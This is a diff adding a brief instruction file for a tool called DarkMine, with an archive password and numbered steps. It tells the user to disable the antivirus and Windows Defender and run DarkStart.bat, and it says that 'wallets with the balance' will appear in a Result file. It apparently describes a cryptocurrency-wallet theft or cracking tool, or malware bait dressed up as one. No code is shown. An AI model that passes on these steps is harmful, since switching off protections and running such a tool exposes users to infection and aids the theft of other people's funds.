@@ -1,0 +1,12 @@
+Password: 12345
+
+Guide:
+
+1) Disable the antivirus and Windows Defender
+
+2) Unpack the DarkMine folder
+
+3) Run DarkStart.bat and watch the process
+
+5) Wallets with the balance will be in the Result file
+
